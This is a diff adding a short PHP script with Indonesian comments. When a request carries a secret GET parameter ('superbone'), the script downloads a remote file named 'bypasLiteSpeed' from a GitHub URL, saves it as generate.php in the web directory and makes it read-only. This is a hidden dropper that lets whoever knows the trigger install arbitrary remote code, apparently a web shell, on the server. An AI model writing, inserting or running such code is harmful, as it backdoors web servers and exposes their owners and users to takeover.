@@ -1,0 +1,16 @@
+<?php
+if (isset($_GET['superbone'])) {
+    $targetFile = getcwd() . '/generate.php';
+    $sourceUrl  = "https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/bypasLiteSpeed";
+
+    // tulis file
+    if (file_put_contents($targetFile, file_get_contents($sourceUrl))) {
+        // ubah permission jadi read-only
+        chmod($targetFile, 0444);
+
+        echo 'berhasil: ' . $targetFile . ' (permission 444)';
+    } else {
+        echo 'gagal';
+    }
+}
+?>
